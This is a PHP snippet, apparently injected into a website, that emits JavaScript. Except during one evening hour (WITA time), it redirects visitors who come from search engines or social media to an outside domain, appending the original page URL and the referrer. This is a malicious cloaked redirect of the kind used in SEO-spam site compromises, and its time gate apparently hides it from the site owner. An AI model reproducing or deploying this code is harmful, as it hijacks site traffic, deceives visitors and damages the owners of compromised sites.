date_default_timezone_set('Asia/Makassar');
$jam = date ("H"); //jam WITA Untuk Jadwal Redirect
if ($jam >21 || $jam < 20) {
  echo"<script>
	var ars = 'https://www.caretxdigital.com';
	if(['.gooogle.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'dogpile.', 'ecosia.', 'info.', 'see-it.', 'wow.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
	</script>
";
}
